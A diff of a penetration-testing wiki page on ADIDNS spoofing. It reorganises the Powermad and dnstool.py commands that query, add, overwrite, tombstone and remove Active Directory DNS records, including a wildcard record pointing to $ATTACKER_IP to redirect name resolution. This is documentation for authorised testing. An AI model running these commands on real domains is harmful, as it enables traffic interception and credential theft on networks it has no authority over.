@@ -17,71 +17,44 @@ ADIDNS zones can be remotely edited
 
 ## Practice
 
-### \(Windows\) Manual record manipulation
-
-On Windows, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to manually add/view/edit/enable/disable/remove records. In the following examples, the wildcard \(`*`\) record is targeted but the examples should also work with other records \(except things like `WPAD` that are in the [GQBL](wpad-spoofing.md#through-adidns-spoofing)\).
+### Manual record manipulation
 
 {% tabs %}
-{% tab title="Get/Read" %}
-The following command can be used to get the value populated in the DNSRecord attribute of a node.
+{% tab title="UNIX-like" %}
+An awesome Python alternative to Powermad's functions is [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py). Theoretically, this script can be used to `add`, `modify`, `query`, `remove`, `resurrect` and `ldapdelete` records in ADIDNS.
 
 ```bash
+dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController
+```
+{% endtab %}
+
+{% tab title="Windows" %}
+On Windows, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to manually add, view, edit, enable, disable or remove records and nodes. In the following examples, the wildcard \(`*`\) node/record is targeted but the examples should also work with other records \(except things like `WPAD` that are in the [GQBL](wpad-spoofing.md#through-adidns-spoofing)\).
+
+```bash
+# get the value populated in the DNSRecord attribute of a node
 Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord
-```
-{% endtab %}
 
-{% tab title="Add" %}
-The following command creates a wildcard record, sets the `DNSRecord` attribute and sets the `DNSTombstoned` attribute, allowing any authenticated user to perform modifications to the node \(this helps maintain control of the node, even when the owner accounts gets deleted. Pretty useful after a pentest\).
-
-```bash
+# creates a wildcard record, sets the DNSRecord and DNSTombstoned attributes
 New-ADIDNSNode -Tombstone -Verbose -Node * -Data $ATTACKER_IP
-```
-{% endtab %}
 
-{% tab title="Set/Edit" %}
-The `Set-ADIDNSNodeAttribute` function can be used to append, populate, or overwrite values in a DNS node attribute. In this case, the command below can be used to set/overwrite the record's value.
-
-```bash
+# append, populate, or overwrite values in a DNS node attribute
 Set-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray -Data $ATTACKER_IP) -Verbose
-```
-{% endtab %}
 
-{% tab title="Enable" %}
-A tombstoned record can be turned again into a valid record with the following command. This should be used in place of `New-ADIDNSNode` when working with nodes that already exist due to being previously added.
-
-```bash
+# a tombstoned record can be turned again into a valid record with the following command
 Enable-ADIDNSNode -Node *
-```
-{% endtab %}
 
-{% tab title="Disable" %}
-A record can be disabled \(i.e. tombstoned\) with the following command. This means the record will still exist but will not be used when resolving names.
-
-```bash
+# disable (i.e. tombstone) a node
 Disable-ADIDNSNode -Node *
-```
-{% endtab %}
 
-{% tab title="Remove" %}
-The following command can be used to fully remove a record.
-
-```bash
+# remove a node
 Remove-ADIDNSNode -Node *
-```
-{% endtab %}
 
-{% tab title="Check/Resolve" %}
-While `ping` can absolutely be used for the job, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to resolve names \(all DNS spoofing attacks need to be stopped in order to avoid false results\).
-
-```bash
+# check the wildcard record works/resolve a name
 Resolve-DnsName NameThatDoesntExist
 ```
 
-That command will either return an IP address, indicating that the wildcard record exists \(or that `NameThatDoesntExist` is an actual explicit record\), or return an error stating that the DNS name doesn't exist, indicating that the wildcard record doesn't exist.
-{% endtab %}
-{% endtabs %}
-
-{% hint style="info" %}
+{% hint style="success" %}
 **TL; DR**: the following command will add a new wildcard record \(if it doesn't already exist\) with the attacker IP set in the DNSRecord attribute
 
 ```bash
@@ -90,18 +63,14 @@ New-ADIDNSNode -Tombstone -Verbose -Node * -Data $ATTACKER_IP
 {% endhint %}
 
 {% hint style="warning" %}
-**Warning**: in some environments, the disabling or removal of the records previously created for tests failed. The records were shown as tombstoned or nonexistant when using functions like `Get-ADIDNSNodeOwner`, `Get-ADIDNSNodeAttribute`, and so on. However, the DNS Manager console was still showing those records and name resolution was still effective. It will probably stay an unsolved mystery for me, but testers need to keep this in mind when abusing ADIDNS.
+**Warning**: in some environments, the disabling or removal of the records previously created for tests failed. The records were shown as tombstoned or nonexistant when using functions like `Get-ADIDNSNodeOwner`, `Get-ADIDNSNodeAttribute`, and so on. I think it was due to some replication issues.
+
+However, the DNS Manager console was still showing those records and name resolution was still effective. It will probably stay an unsolved mystery for me, but testers need to keep this in mind when abusing ADIDNS.
 {% endhint %}
 
 More help on usage, support functions, parameters and attacks [here](https://github.com/Kevin-Robertson/Powermad#adidns-functions).
-
-### \(UNIX\) Manual record manipulation
-
-An awesome Python alternative to Powermad's functions is [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py). Theoretically, this script can be used to `add`, `modify`, `query`, `remove`, `resurrect` and `ldapdelete` records in ADIDNS.
-
-```bash
-dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController
-```
+{% endtab %}
+{% endtabs %}
 
 ### Dynamic spoofing
 
